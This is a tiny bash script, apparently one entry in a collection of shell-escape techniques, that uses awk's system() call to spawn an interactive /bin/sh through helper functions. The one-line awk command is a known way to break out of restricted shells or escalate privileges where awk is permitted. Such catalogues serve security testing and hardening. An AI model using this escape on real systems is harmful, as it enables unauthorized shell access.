#!/bin/bash

: '
awk - get interactive shell
'

execute_command "awk 'BEGIN {system(\"/bin/sh\")}'"
create_new_line
